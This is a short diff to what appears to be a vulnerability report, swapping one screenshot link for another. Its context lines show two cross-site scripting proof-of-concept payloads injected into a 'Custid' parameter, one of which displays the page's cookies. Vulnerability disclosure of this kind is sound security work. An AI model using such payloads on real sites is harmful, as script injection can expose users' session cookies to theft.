@@ -14,4 +14,4 @@ Payload1: Custid=<script>alert(999)</script>
 
 Payload2: Custid=<script>alert(document.cookie)</script>
 
-![image](https://github.com/XIAONIGM/CVEReport/blob/main/1.png)
+![image](https://github.com/XIAONIGM/CVEReport/blob/main/2.png)
